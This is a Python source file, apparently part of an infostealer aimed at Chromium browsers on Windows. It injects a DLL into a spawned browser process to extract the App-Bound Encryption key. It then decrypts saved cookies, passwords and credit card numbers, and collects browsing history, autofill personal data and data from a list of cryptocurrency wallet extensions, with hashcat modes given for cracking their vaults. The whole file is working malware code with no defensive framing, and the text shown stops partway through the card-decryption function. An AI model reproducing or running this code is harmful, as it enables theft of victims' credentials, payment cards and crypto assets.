def _inject_abe(browser_exe: str, dll_path: str, enc_key: bytes,
                timeout: int = 30) -> bytes:
    sandbox = tempfile.mkdtemp(prefix="ph_inj_")
    ip = os.path.join(sandbox, "ph_in.bin")
    op = os.path.join(sandbox, "ph_out.bin")
    ep = os.path.join(sandbox, "ph_err.txt")

    with open(ip, "wb") as f:
        f.write(enc_key)

    env = os.environ.copy()
    env["TEMP"] = sandbox
    env["TMP"] = sandbox

    proc = subprocess.Popen([browser_exe, "--version"], creationflags=0x4,
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                            env=env)

    try:
        hp = None
        for _attempt in range(30):
            if proc.poll() is not None:
                raise RuntimeError(
                    f"browser exited before injection "
                    f"(rc={proc.returncode})")
            hp = k32.OpenProcess(0x1F0FFF, False, proc.pid)
            if hp:
                break
            time.sleep(0.05)
        if not hp:
            raise RuntimeError(f"OpenProcess {ctypes.get_last_error()}")

        try:
            pb = (dll_path + "\x00").encode("utf-16-le")
            addr = k32.VirtualAllocEx(hp, None, len(pb), 0x3000, 0x04)
            if not addr:
                raise RuntimeError(
                    f"VirtualAllocEx {ctypes.get_last_error()}")

            w = ctypes.c_size_t(0)
            if not k32.WriteProcessMemory(hp, addr, pb, len(pb),
                                           ctypes.byref(w)):
                raise RuntimeError(
                    f"WriteProcessMemory {ctypes.get_last_error()}")

            hk = k32.GetModuleHandleW("kernel32.dll")
            ll = k32.GetProcAddress(hk, b"LoadLibraryW")
            tid = wt.DWORD(0)
            ht = k32.CreateRemoteThread(hp, None, 0, ll, addr, 0,
                                         ctypes.byref(tid))
            if not ht:
                raise RuntimeError(
                    f"CreateRemoteThread {ctypes.get_last_error()}")

            k32.WaitForSingleObject(ht, 10000)
            k32.CloseHandle(ht)

            end = time.time() + timeout
            while time.time() < end:
                if os.path.isfile(op):
                    time.sleep(0.3)
                    with open(op, "rb") as f:
                        return f.read()
                if os.path.isfile(ep):
                    with open(ep, encoding="utf-8",
                              errors="replace") as f:
                        raise RuntimeError(f"DLL: {f.read()}")
                time.sleep(0.3)

            raise RuntimeError("timeout")
        finally:
            k32.CloseHandle(hp)
    finally:
        try:
            proc.terminate(); proc.wait(timeout=3)
        except Exception:
            try:
                proc.kill()
            except Exception:
                pass
        shutil.rmtree(sandbox, ignore_errors=True)


def _get_abe_key(cfg: dict, drops: Optional[Drops] = None,
                 timeout: int = 30) -> Optional[bytes]:
    if not cfg.get("abe"):
        return None
    ud = cfg["user_data"]
    ls = os.path.join(ud, "Local State")
    if not os.path.isfile(ls):
        if drops:
            drops.add("abe", "no_local_state", browser=cfg["name"])
        return None
    try:
        with open(ls, encoding="utf-8") as f:
            L = json.load(f)
        kb = L.get("os_crypt", {}).get("app_bound_encrypted_key")
    except Exception as e:
        if drops:
            drops.add("abe", "local_state_parse", err=str(e)[:120])
        return None
    if not kb:
        if drops:
            drops.add("abe", "no_abe_key_in_state", browser=cfg["name"])
        return None

    raw = base64.b64decode(kb)
    if not raw.startswith(b"APPB"):
        if drops:
            drops.add("abe", "bad_abe_prefix", prefix=raw[:4].hex())
        return None

    exe = next((p for p in cfg["exe"] if os.path.isfile(p)), None)
    if not exe:
        if drops:
            drops.add("abe", "no_browser_exe")
        return None

    svc = _ensure_service(cfg["services"])
    if not svc:
        if drops:
            drops.add("abe", "service_unavailable",
                      services=",".join(cfg["services"]))
        return None

   
    dll, tdir = _resolve_abe_dll(cfg)

    if not dll:
        if drops:
            drops.add("abe", "compile_failed", browser=cfg["name"])
        return None

    try:
        key = _inject_abe(exe, dll, raw[4:], timeout=timeout)
        if key and len(key) == 32:
            return key
        if drops:
            drops.add("abe", "bad_key_length",
                      length=len(key) if key else 0)
        return None
    except Exception as e:
        if drops:
            drops.add("abe", "inject_failed", err=str(e)[:200])
        return None
    finally:
        if tdir:
            shutil.rmtree(tdir, ignore_errors=True)


_AES = None


def _get_aes():
    global _AES
    if _AES is not None:
        return _AES
    from Crypto.Cipher import AES
    _AES = AES
    return _AES


def _gcm_dec(data: bytes, key: bytes, aad: Optional[bytes]) -> Optional[bytes]:
    if len(data) < 28:
        return None
    try:
        AES = _get_aes()
        c = AES.new(key, AES.MODE_GCM, nonce=data[:12])
        if aad:
            c.update(aad)
        return c.decrypt_and_verify(data[12:-16], data[-16:])
    except Exception:
        return None


def _strip_sha(pt: bytes, hs: List[bytes]) -> bytes:
    for h in hs:
        if len(pt) > 32 and pt[:32] == h:
            return pt[32:]
    return pt


def _aad_set(host: str, tfk: str, ss, sp) -> Tuple[List[bytes], List[bytes]]:
    hosts = [host] + ([host[1:]] if host.startswith(".") else ["." + host])
    tfks = [""] + ([tfk, tfk[1:] if tfk.startswith(".") else "." + tfk]
                   if tfk else [])
    ssx = [""] + ([str(ss)] if ss else [])
    spx = [""] + ([str(sp)] if sp else [])
    raw_strs: List[str] = []
    for h in hosts:
        raw_strs.append(h)
        for tf in tfks:
            if tf:
                for sep in ("", ".", ",", "|", "\0", ":"):
                    raw_strs.append(h + sep + tf)
                raw_strs.append(tf + h)
        for sc in ssx:
            if sc:
                raw_strs.append(h + sc)
                raw_strs.append(h + "://" + sc)
                for po in spx:
                    if po:
                        raw_strs.append(h + sc + po)
                        raw_strs.append(h + sc + ":" + po)

    hashes, seen_h = [], set()
    for r in raw_strs:
        d = hashlib.sha256(r.encode("utf-8")).digest()
        if d not in seen_h:
            seen_h.add(d); hashes.append(d)

    raws, seen_r = [], set()
    for r in raw_strs:
        b = r.encode("utf-8")
        if b not in seen_r:
            seen_r.add(b); raws.append(b)

    candidates, seen_c = [], set()
    for c in hashes + raws:
        if c not in seen_c:
            seen_c.add(c); candidates.append(c)
    return hashes, candidates


def _dec_cookie(enc: bytes, host: str, tfk: str, abe: Optional[bytes],
                dpapi: Optional[bytes], ss=None, sp=None) -> Optional[bytes]:
    if not enc or len(enc) < 4:
        return None
    p = enc[:3]
    key = (abe if p == b"v20"
           else (dpapi if p in (b"v10", b"v11") else None))
    if not key:
        return None
    hashes, cands = _aad_set(host, tfk, ss, sp)
    for a in [cands[0], None] + cands[1:]:
        pt = _gcm_dec(enc[3:], key, aad=a)
        if pt is not None:
            return _strip_sha(pt, hashes)
    return None


def _dec_pw(enc: bytes, url: str, realm: str, abe: Optional[bytes],
            dpapi: Optional[bytes]) -> Optional[bytes]:
    if not enc or len(enc) < 4:
        return None
    p = enc[:3]
    key = (abe if p == b"v20"
           else (dpapi if p in (b"v10", b"v11") else None))
    if not key:
        return None

    candidates: List[Optional[bytes]] = []
    seen: set = set()

    def _push(b):
        if b is None:
            if None not in seen:
                seen.add(None)
                candidates.append(None)
            return
        if not isinstance(b, bytes):
            b = b.encode("utf-8", errors="replace")
        if b not in seen:
            seen.add(b)
            candidates.append(b)

    for raw in (realm, url):
        if not raw:
            continue
        _push(hashlib.sha256(raw.encode("utf-8")).digest())
        _push(raw)
        _push(raw + "\x00")
        try:
            u = urlparse(raw)
            host = u.hostname or ""
            origin = (u.scheme + "://" + u.netloc) if u.scheme and u.netloc else ""
            hostport = u.netloc or ""
            for variant in (host, origin, hostport,
                            origin + "/", raw.rstrip("/"),
                            raw + "/"):
                if variant:
                    _push(variant)
                    _push(hashlib.sha256(variant.encode("utf-8")).digest())
        except Exception:
            pass

    if None not in seen:
        candidates.insert(0, None)

    for a in candidates:
        pt = _gcm_dec(enc[3:], key, aad=a)
        if pt is not None:
            for h in (hashlib.sha256((realm or "").encode("utf-8")).digest(),
                      hashlib.sha256((url or "").encode("utf-8")).digest()):
                if len(pt) > 32 and pt[:32] == h:
                    return pt[32:]
            return pt
    return None


def _dec_card(enc: bytes, guid: Optional[str], abe: Optional[bytes],
              dpapi: Optional[bytes]) -> Optional[bytes]:
    if not enc or len(enc) < 4:
        return None
    p = enc[:3]
    key = (abe if p == b"v20"
           else (dpapi if p in (b"v10", b"v11") else None))
    if not key:
        return None
    candidates = [None]
    if guid:
        candidates.append(guid.encode("utf-8") if isinstance(guid, str) else guid)
    for a in candidates:
        pt = _gcm_dec(enc[3:], key, aad=a)
        if pt is not None:
            return pt
    return None


def _copy_shared_win32(src: str, dst: str) -> bool:
    try:
        GENERIC_READ = 0x80000000
        FILE_SHARE_ALL = 0x7
        OPEN_EXISTING = 3
        FILE_ATTRIBUTE_NORMAL = 0x80
        INVALID_HANDLE = ctypes.c_void_p(-1).value

        h = k32.CreateFileW(src, GENERIC_READ, FILE_SHARE_ALL, None,
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, None)
        if not h or h == INVALID_HANDLE:
            return False
        try:
            with open(dst, "wb") as out:
                buf = ctypes.create_string_buffer(65536)
                bytes_read = wt.DWORD(0)
                while True:
                    ok = k32.ReadFile(h, buf, 65536,
                                       ctypes.byref(bytes_read), None)
                    if not ok or bytes_read.value == 0:
                        break
                    out.write(buf.raw[:bytes_read.value])
            return True
        finally:
            k32.CloseHandle(h)
    except Exception:
        return False


def _copy_file(src: str, dst: str, attempts: int = 5) -> bool:
    for i in range(attempts):
        try:
            shutil.copy2(src, dst)
            return True
        except Exception:
            time.sleep(0.2 * (i + 1))
    return _copy_shared_win32(src, dst)


def _copy_dir(src: str, dst: str) -> bool:
    try:
        shutil.copytree(src, dst)
        return True
    except Exception:
        pass
    if os.name != "nt":
        return False
    ok_any = False
    try:
        os.makedirs(dst, exist_ok=True)
        for name in os.listdir(src):
            s = os.path.join(src, name)
            d = os.path.join(dst, name)
            if os.path.isfile(s):
                if _copy_shared_win32(s, d):
                    ok_any = True
            elif os.path.isdir(s):
                _copy_dir(s, d)
        return ok_any
    except Exception:
        return ok_any


def _safe_copy(db: str, attempts: int = 5) -> Tuple[Optional[str], bool]:
    fd, tmp = tempfile.mkstemp(suffix=".db")
    os.close(fd)

    try:
        if not _copy_file(db, tmp, attempts):
            try:
                os.unlink(tmp)
            except OSError:
                pass
            return None, False

        wal_ok = True
        for ext in ("-wal", "-shm", "-journal"):
            src = db + ext
            if not os.path.isfile(src):
                continue
            if not _copy_file(src, tmp + ext, attempts):
                wal_ok = False

        return tmp, wal_ok
    except Exception:
        try:
            os.unlink(tmp)
        except OSError:
            pass
        return None, False


def _rm_db(tmp: Optional[str]) -> None:
    if not tmp:
        return
    for ext in ("", "-wal", "-shm", "-journal"):
        try:
            os.remove(tmp + ext)
        except Exception:
            pass


def _safe_domain(h: str) -> str:
    s = re.sub(r"[^A-Za-z0-9._-]", "_", (h or "").lstrip("."))
    return s[:200] or "unknown"


def _url_domain(url: str) -> str:
    try:
        p = urlparse(url)
        return _safe_domain(p.hostname or p.netloc or url.split("/")[2])
    except Exception:
        return "unknown"


def _ctime(exp) -> int:
    if not exp:
        return 0
    try:
        return max(0, int(exp) // 1000000 - 11644473600)
    except Exception:
        return 0


def _ldb_varint(data: bytes, pos: int) -> Tuple[int, int]:
    result = 0
    shift = 0
    while pos < len(data):
        b = data[pos]
        pos += 1
        result |= (b & 0x7F) << shift
        if not (b & 0x80):
            return result, pos
        shift += 7
        if shift > 35:
            raise ValueError("varint overflow")
    raise ValueError("varint eof")


def _ldb_writebatch(data: bytes) -> List[Tuple[bytes, Optional[bytes], int]]:
    out: List[Tuple[bytes, Optional[bytes], int]] = []
    if len(data) < 12:
        return out
    seq = int.from_bytes(data[0:8], "little")
    count = int.from_bytes(data[8:12], "little")
    pos = 12
    for i in range(count):
        if pos >= len(data):
            break
        tag = data[pos]; pos += 1
        try:
            klen, pos = _ldb_varint(data, pos)
        except ValueError:
            break
        if pos + klen > len(data):
            break
        key = data[pos:pos + klen]; pos += klen
        if tag == 1:
            try:
                vlen, pos = _ldb_varint(data, pos)
            except ValueError:
                break
            if pos + vlen > len(data):
                break
            val = data[pos:pos + vlen]; pos += vlen
            out.append((key, val, seq + i))
        elif tag == 0:
            out.append((key, None, seq + i))
        else:
            break
    return out


def _ldb_parse_log(path: str) -> List[Tuple[bytes, Optional[bytes], int]]:
    out: List[Tuple[bytes, Optional[bytes], int]] = []
    BLOCK = 32768
    HEADER = 7
    try:
        with open(path, "rb") as f:
            data = f.read()
    except OSError:
        return out
    n_blocks = (len(data) + BLOCK - 1) // BLOCK
    buf = b""
    for bi in range(n_blocks):
        start = bi * BLOCK
        end = min(start + BLOCK, len(data))
        pos = start
        while end - pos >= HEADER:
            length = int.from_bytes(data[pos + 4:pos + 6], "little")
            rtype = data[pos + 6]
            if pos + HEADER + length > end:
                break
            if length == 0 and rtype == 0:
                pos += HEADER
                continue
            payload = data[pos + HEADER:pos + HEADER + length]
            pos += HEADER + length
            if rtype == 0:
                buf = payload
                out.extend(_ldb_writebatch(buf))
                buf = b""
            elif rtype == 1:
                buf = payload
            elif rtype == 2:
                buf += payload
            elif rtype == 3:
                buf += payload
                out.extend(_ldb_writebatch(buf))
                buf = b""
            else:
                break
    return out


def _snappy_minimal(data: bytes) -> Optional[bytes]:
    try:
        ulen, pos = _ldb_varint(data, 0)
    except ValueError:
        return None
    out = bytearray()
    while pos < len(data):
        tag = data[pos]; pos += 1
        ttype = tag & 3
        if ttype == 0:
            n = tag >> 2
            if n < 60:
                n += 1
            else:
                extra = n - 59
                if pos + extra > len(data):
                    return None
                n = int.from_bytes(data[pos:pos + extra], "little") + 1
                pos += extra
            if pos + n > len(data):
                return None
            out += data[pos:pos + n]
            pos += n
        elif ttype == 1:
            n = ((tag >> 2) & 7) + 4
            if pos >= len(data):
                return None
            off = ((tag >> 5) << 8) | data[pos]
            pos += 1
            if off == 0 or off > len(out):
                return None
            for _ in range(n):
                out.append(out[-off])
        elif ttype == 2:
            n = (tag >> 2) + 1
            if pos + 2 > len(data):
                return None
            off = int.from_bytes(data[pos:pos + 2], "little")
            pos += 2
            if off == 0 or off > len(out):
                return None
            for _ in range(n):
                out.append(out[-off])
        else:
            n = (tag >> 2) + 1
            if pos + 4 > len(data):
                return None
            off = int.from_bytes(data[pos:pos + 4], "little")
            pos += 4
            if off == 0 or off > len(out):
                return None
            for _ in range(n):
                out.append(out[-off])
    if len(out) != ulen:
        return None
    return bytes(out)


def _snappy_decompress(data: bytes) -> Optional[bytes]:
    try:
        import snappy
        try:
            return snappy.decompress(data)
        except Exception:
            return None
    except ImportError:
        return _snappy_minimal(data)


def _ldb_read_block(data: bytes, offset: int,
                    size: int) -> List[Tuple[bytes, bytes]]:
    out: List[Tuple[bytes, bytes]] = []
    end = offset + size
    if end > len(data) or end + 5 > len(data):
        return out
    content = data[offset:end]
    comp = data[end]
    if comp == 1:
        dec = _snappy_decompress(content)
        if dec is None:
            return out
        payload = dec
    elif comp == 0:
        payload = content
    else:
        return out
    if len(payload) < 4:
        return out
    num_restarts = int.from_bytes(payload[-4:], "little")
    restarts_start = len(payload) - 4 - 4 * num_restarts
    if restarts_start < 0:
        return out
    pos = 0
    last_key = b""
    while pos < restarts_start:
        try:
            shared, pos = _ldb_varint(payload, pos)
            unshared, pos = _ldb_varint(payload, pos)
            vlen, pos = _ldb_varint(payload, pos)
        except ValueError:
            break
        if pos + unshared + vlen > len(payload):
            break
        key = last_key[:shared] + payload[pos:pos + unshared]
        pos += unshared
        val = payload[pos:pos + vlen]
        pos += vlen
        last_key = key
        out.append((key, val))
    return out


def _ldb_parse_table(path: str) -> List[Tuple[bytes, Optional[bytes], int]]:
    out: List[Tuple[bytes, Optional[bytes], int]] = []
    try:
        with open(path, "rb") as f:
            data = f.read()
    except OSError:
        return out
    if len(data) < 48:
        return out
    footer = data[-48:]
    magic = int.from_bytes(footer[-8:], "little")
    if magic != 0xDB4775248B80FB57:
        return out
    body = footer[:-8]
    p = 0
    try:
        mi_off, p = _ldb_varint(body, p)
        mi_sz, p = _ldb_varint(body, p)
        ix_off, p = _ldb_varint(body, p)
        ix_sz, p = _ldb_varint(body, p)
    except ValueError:
        return out
    index = _ldb_read_block(data, ix_off, ix_sz)
    for _ik, iv in index:
        try:
            off, p2 = _ldb_varint(iv, 0)
            sz, p2 = _ldb_varint(iv, p2)
        except ValueError:
            continue
        for k, v in _ldb_read_block(data, off, sz):
            if len(k) < 8:
                continue
            tag = int.from_bytes(k[-8:], "little")
            seq = tag >> 8
            typ = tag & 0xFF
            user_key = k[:-8]
            if typ == 0:
                out.append((user_key, None, seq))
            else:
                out.append((user_key, v, seq))
    return out


def _read_leveldb(directory: str) -> List[Tuple[bytes, bytes]]:
    if not os.path.isdir(directory):
        return []
    latest: Dict[bytes, Tuple[int, Optional[bytes]]] = {}

    def _consider(key: bytes, val: Optional[bytes], seq: int) -> None:
        prev = latest.get(key)
        if prev is None or seq > prev[0]:
            latest[key] = (seq, val)

    files = sorted(os.listdir(directory))
    for name in files:
        path = os.path.join(directory, name)
        if not os.path.isfile(path):
            continue
        if name.endswith(".log"):
            for key, val, seq in _ldb_parse_log(path):
                _consider(key, val, seq)
    for name in files:
        path = os.path.join(directory, name)
        if not os.path.isfile(path):
            continue
        if name.endswith(".ldb") or name.endswith(".sst"):
            for key, val, seq in _ldb_parse_table(path):
                _consider(key, val, seq)

    return [(k, v) for k, (_seq, v) in latest.items() if v is not None]


_WALLET_REGISTRY = {
    "nkbihfbeogaeaoehlefnkodbefgpgknn": {
        "name": "MetaMask", "scheme": "metamask", "hashcat_mode": 26600,
    },
    "ejbalbakoplchlghecdalmeeeajnimhm": {
        "name": "MetaMask Beta", "scheme": "metamask", "hashcat_mode": 26600,
    },
    "bfnaelmomeimhlpmgjnjophhpkkoljpa": {
        "name": "Phantom", "scheme": "phantom", "hashcat_mode": None,
    },
    "hnfanknocfeofbddgcijnmhnfnkdnaad": {
        "name": "Coinbase Wallet", "scheme": "coinbase", "hashcat_mode": None,
    },
    "acmacodkjbdgmoleebolmdjonilkdbch": {
        "name": "Rabby", "scheme": "rabby", "hashcat_mode": None,
    },
    "egjidjbpglichdcondbcbdnbeeppgdph": {
        "name": "Trust Wallet", "scheme": "trust", "hashcat_mode": None,
    },
    "fhbohimaelbohpjbbldcngcnapndodjp": {
        "name": "Binance Wallet", "scheme": "generic", "hashcat_mode": None,
    },
    "mcohilncbfahbmgdjkbpemcciiolgcge": {
        "name": "OKX Wallet", "scheme": "generic", "hashcat_mode": None,
    },
    "ibnejdfjmmkpcnlpebklmnkoeoihofec": {
        "name": "TronLink", "scheme": "generic", "hashcat_mode": None,
    },
    "pdadjkfkgcafgbceimcpbkalnfnepbnk": {
        "name": "Petra (Aptos)", "scheme": "generic", "hashcat_mode": None,
    },
    "fnjhmkhhmkbjbbgmbjenilamgecjbfjh": {
        "name": "Martian (Aptos)", "scheme": "generic", "hashcat_mode": None,
    },
    "phkbamefinggmakgklpkljjmgibohnba": {
        "name": "Pontem (Aptos)", "scheme": "generic", "hashcat_mode": None,
    },
    "djclckkglechooblngghdinmeemkbgci": {
        "name": "Keplr (Cosmos)", "scheme": "generic", "hashcat_mode": None,
    },
    "lpfcbjknijpeeillifnkikgncikgfhdo": {
        "name": "Nami (Cardano)", "scheme": "generic", "hashcat_mode": None,
    },
    "ndgimibanhlabgdgjcpbbndiehljcpfh": {
        "name": "Yoroi (Cardano)", "scheme": "generic", "hashcat_mode": None,
    },
    "jiidiaalihmmhddjgbnbgdfflehlfmmm": {
        "name": "Temple (Tezos)", "scheme": "generic", "hashcat_mode": None,
    },
    "ebfidpplhabeedpnhjnobghokpiioolj": {
        "name": "Fewcha (Sui)", "scheme": "generic", "hashcat_mode": None,
    },
    "aeachknmefphepccionboohckonoeemg": {
        "name": "Coin98", "scheme": "generic", "hashcat_mode": None,
    },
}

_WALLET_EXTENSIONS = {k: v["name"] for k, v in _WALLET_REGISTRY.items()}

_VAULT_CIPHER_FIELDS = {"cipher", "ciphertext", "encrypted", "data",
                        "value", "ct", "enc"}
_VAULT_KDF_FIELDS = {"salt", "iv", "nonce", "iterations", "iteration",
                     "keymetadata", "kdf", "params"}

_NON_PROFILE_DIRS = {
    "Crashpad", "ShaderCache", "GrShaderCache", "GraphiteDawnCache",
    "BrowserMetrics", "Safe Browsing", "CertificateRevocation",
    "component_crx_cache", "extensions_crx_cache", "Snapshots",
    "OptimizationHints", "segmentation_platform", "MEIPreload",
    "WidevineCdm", "First Run", "SwReporter",
}


def _chromium_profiles(ud: str, mode: str) -> List[str]:
    if not os.path.isdir(ud):
        return []
    if mode == "single":
        return ([os.path.basename(ud)]
                if os.path.isfile(os.path.join(ud, "Preferences")) else [])
    out = []
    for n in sorted(os.listdir(ud)):
        p = os.path.join(ud, n)
        if not os.path.isdir(p):
            continue
        if n in _NON_PROFILE_DIRS:
            continue
        if any(os.path.isfile(os.path.join(p, x)) for x in
               ("Preferences", "Network/Cookies", "Cookies",
                "Login Data", "Login Data For Account",
                "History", "Web Data", "Bookmarks")):
            out.append(n)
    return out


def _chromium_cookie_dbs(ud: str, prof: str, mode: str) -> List[str]:
    root = ud if mode == "single" else os.path.join(ud, prof)
    out = []
    for rel in ("Network/Cookies", "Cookies"):
        p = os.path.join(root, rel.replace("/", os.sep))
        if os.path.isfile(p):
            out.append(p)
    wa = os.path.join(root, "Web Applications")
    if os.path.isdir(wa):
        for e in os.listdir(wa):
            ap = os.path.join(wa, e)
            if not os.path.isdir(ap):
                continue
            for c in (os.path.join(ap, "Network", "Cookies"),
                      os.path.join(ap, "Cookies")):
                if os.path.isfile(c):
                    out.append(c)
    return out


def _query_db(db: str, query: str, drops: Drops, cat: str,
              retries: int = DEFAULT_RETRIES
              ) -> Tuple[List[Tuple], bool, bool]:
    tmp, wal_ok = _safe_copy(db, retries)
    if not tmp:
        drops.add(cat, "copy_failed", db=db)
        return [], True, True
    try:
        con = sqlite3.connect(tmp)
        try:
            cur = con.cursor()
            cur.execute(query)
            rows = cur.fetchall()
            return rows, wal_ok, False
        finally:
            con.close()
    except sqlite3.Error as exc:
        drops.add(cat, "query_failed", db=db, err=str(exc))
        return [], wal_ok, False
    finally:
        _rm_db(tmp)


def _chromium_cookies(db: str, abe: Optional[bytes], dpapi: Optional[bytes],
                      drops: Drops, retries: int = DEFAULT_RETRIES
                      ) -> Tuple[List[dict], bool, bool]:
    tmp, wal_ok = _safe_copy(db, retries)
    if not tmp:
        drops.add("cookie", "copy_failed", db=db)
        return [], True, True
    res = []
    try:
        con = sqlite3.connect(tmp)
        cur = con.cursor()
        cur.execute("PRAGMA table_info(cookies)")
        cols = {r[1] for r in cur.fetchall()}
        sel = ["host_key", "name", "value", "encrypted_value",
               "path", "expires_utc", "is_secure", "is_httponly"]
        extra = []
        for c in ("top_frame_site_key", "source_scheme", "source_port"):
            if c in cols:
                extra.append(c); sel.append(c)
        cur.execute(f"SELECT {', '.join(sel)} FROM cookies")
        for row in cur.fetchall():
            base = row[:8]; ex = dict(zip(extra, row[8:]))
            host, name, val, enc, path, exp, sec, http = base
            tfk = ex.get("top_frame_site_key", "") or ""
            ss = ex.get("source_scheme", "") or ""
            sp = ex.get("source_port", "") or ""
            vb = None
            if val:
                vb = val.encode("utf-8") if isinstance(val, str) else val
            elif enc:
                vb = _dec_cookie(enc, host, tfk, abe, dpapi, ss, sp)
            if vb is None:
                if not enc and not val:
                    drops.add("cookie", "empty", host=host, name=name)
                elif enc and enc[:3] == b"v20" and not abe:
                    drops.add("cookie", "no_abe_key", host=host, name=name)
                elif enc and enc[:3] in (b"v10", b"v11") and not dpapi:
                    drops.add("cookie", "no_dpapi_key", host=host, name=name)
                elif enc and enc[:3] not in (b"v10", b"v11", b"v20"):
                    drops.add("cookie", "unknown_prefix",
                              host=host, name=name, prefix=enc[:3].hex())
                else:
                    drops.add("cookie", "decrypt_fail",
                              host=host, name=name,
                              prefix=enc[:3].decode("latin-1",
                                                    errors="replace"))
                continue
            res.append({"host": host, "name": name, "value": vb,
                        "path": path or "/", "expires_unix": _ctime(exp),
                        "secure": bool(sec), "httponly": bool(http)})
        con.close()
    finally:
        _rm_db(tmp)
    return res, wal_ok, False


def _chromium_pw_dbs(root: str) -> List[str]:
    return [os.path.join(root, n) for n in
            ("Login Data", "Login Data For Account")
            if os.path.isfile(os.path.join(root, n))]


def _chromium_passwords(db: str, abe: Optional[bytes], dpapi: Optional[bytes],
                        drops: Drops, retries: int = DEFAULT_RETRIES
                        ) -> Tuple[List[dict], bool, bool]:
    tmp, wal_ok = _safe_copy(db, retries)
    if not tmp:
        drops.add("password", "copy_failed", db=db)
        return [], True, True
    res = []
    try:
        con = sqlite3.connect(tmp)
        cur = con.cursor()
        cur.execute("PRAGMA table_info(logins)")
        cols = {r[1] for r in cur.fetchall()}
        if "password_value" not in cols:
            drops.add("password", "missing_password_column", db=os.path.basename(db))
            con.close()
            return res, wal_ok, False

        sel = ["origin_url", "username_value", "password_value"]
        sel.insert(1, "signon_realm" if "signon_realm" in cols
                   else "'' AS signon_realm")
        wh = (" WHERE COALESCE(blacklisted_by_user, 0) = 0"
              if "blacklisted_by_user" in cols else "")
        cur.execute(f"SELECT {', '.join(sel)} FROM logins{wh}")
        rows = cur.fetchall()

        if not rows:
            drops.add("password", "empty_logins_table", db=os.path.basename(db))
            con.close()
            return res, wal_ok, False

        for url, realm, user, enc in rows:
            if not enc:
                drops.add("password", "empty", url=url)
                continue
            d = _dec_pw(enc, url, realm, abe, dpapi)
            if d is None:
                if enc[:3] == b"v20" and not abe:
                    drops.add("password", "no_abe_key", url=url, realm=realm)
                elif enc[:3] in (b"v10", b"v11") and not dpapi:
                    drops.add("password", "no_dpapi_key",
                              url=url, realm=realm)
                elif enc[:3] not in (b"v10", b"v11", b"v20"):
                    drops.add("password", "unknown_prefix",
                              url=url, realm=realm, prefix=enc[:3].hex())
                else:
                    drops.add("password", "decrypt_fail",
                              url=url, realm=realm)
                continue
            try:
                pw = d.decode("utf-8")
            except UnicodeDecodeError:
                pw = d.decode("latin-1")
            res.append({"url": url or "",
                        "username": user or "",
                        "password": pw})
        con.close()
    finally:
        _rm_db(tmp)
    return res, wal_ok, False


def _chromium_history(profile_dir: str, drops: Drops,
                      retries: int = DEFAULT_RETRIES) -> List[dict]:
    db = os.path.join(profile_dir, "History")
    if not os.path.isfile(db):
        return []
    rows, _wal, _cf = _query_db(
        db,
        "SELECT url, title, visit_count, last_visit_time "
        "FROM urls ORDER BY last_visit_time DESC",
        drops, "history", retries)
    out = []
    for url, title, vc, t in rows:
        out.append({"url": url or "", "title": title or "",
                    "visit_count": int(vc or 0),
                    "last_visit_unix": _ctime(t)})
    return out


def _chromium_autofill(profile_dir: str, drops: Drops,
                       retries: int = DEFAULT_RETRIES) -> dict:
    db = os.path.join(profile_dir, "Web Data")
    if not os.path.isfile(db):
        return {"fields": [], "profiles": []}
    fields = []
    rows, _wal, _cf = _query_db(
        db, "SELECT name, value, count FROM autofill "
            "ORDER BY count DESC", drops, "autofill", retries)
    for name, value, count in rows:
        if not value:
            continue
        fields.append({"name": name or "", "value": value,
                       "count": int(count or 0)})

    profiles: List[dict] = []
    tmp, wal_ok = _safe_copy(db, retries)
    if not tmp:
        drops.add("autofill", "copy_failed", db=db)
        return {"fields": fields, "profiles": profiles}
    try:
        con = sqlite3.connect(tmp)
        cur = con.cursor()
        cur.execute("PRAGMA table_info(autofill_profiles)")
        pcols = {r[1] for r in cur.fetchall()}
        if pcols:
            cur.execute("SELECT * FROM autofill_profiles")
            desc = [d[0] for d in cur.description]
            for row in cur.fetchall():
                d = dict(zip(desc, row))
                guid = d.get("guid", "")
                names = []
                emails = []
                phones = []
                try:
                    cur.execute(
                        "SELECT first_name, middle_name, last_name, full_name "
                        "FROM autofill_profile_names WHERE guid = ?",
                        (guid,))
                    for fn, mn, ln, full in cur.fetchall():
                        parts = [x for x in (fn, mn, ln) if x]
                        nm = full or " ".join(parts)
                        if nm:
                            names.append(nm)
                except sqlite3.Error:
                    pass
                try:
                    cur.execute(
                        "SELECT email FROM autofill_profile_emails "
                        "WHERE guid = ?", (guid,))
                    emails = [r[0] for r in cur.fetchall() if r[0]]
                except sqlite3.Error:
                    pass
                try:
                    cur.execute(
                        "SELECT number FROM autofill_profile_phones "
                        "WHERE guid = ?", (guid,))
                    phones = [r[0] for r in cur.fetchall() if r[0]]
                except sqlite3.Error:
                    pass
                profiles.append({
                    "guid": guid,
                    "company": d.get("company_name", "") or "",
                    "street": d.get("street_address", "") or "",
                    "city": d.get("city", "") or "",
                    "state": d.get("state", "") or "",
                    "zip": d.get("zipcode", "") or "",
                    "country": d.get("country_code", "") or "",
                    "use_count": int(d.get("use_count", 0) or 0),
                    "names": names, "emails": emails, "phones": phones,
                })
        con.close()
    except sqlite3.Error as exc:
        drops.add("autofill", "query_failed", db=db, err=str(exc))
    finally:
        _rm_db(tmp)
    return {"fields": fields, "profiles": profiles}


def _chromium_cards(profile_dir: str, abe: Optional[bytes],
                    dpapi: Optional[bytes], drops: Drops,
                    retries: int = DEFAULT_RETRIES) -> dict:
    db = os.path.join(profile_dir, "Web Data")
    if not os.path.isfile(db):
        return {"cards": [], "ibans": []}
    cards: List[dict] = []
    ibans: List[dict] = []
    tmp, wal_ok = _safe_copy(db, retries)
    if not tmp:
        drops.add("cards", "copy_failed", db=db)
        return {"cards": [], "ibans": []}
    try:
        con = sqlite3.connect(tmp)
        cur = con.cursor()
        cur.execute("PRAGMA table_info(credit_cards)")
        ccols = {r[1] for r in cur.fetchall()}
        if ccols:
            cur.execute("SELECT * FROM credit_cards")
            desc = [d[0] for d in cur.description]
            for row in cur.fetchall():
                d = dict(zip(desc, row))
                enc = d.get("card_number_encrypted")
                guid = d.get("guid", "") or ""
                number = ""
                if enc:
                    dec = _dec_card(enc, guid, abe, dpapi)
                    if dec is None:
                        if enc[:3] == b"v20" and not abe:
                            drops.add("cards", "no_abe_key",
                                      guid=guid, nickname=d.get("nickname", ""))
                        elif enc[:3] in (b"v10", b"v11") and not dpapi:
                            drops.add("cards", "no_dpapi_key",
                                      guid=guid, nickname=d.get("nickname", ""))
                        else:
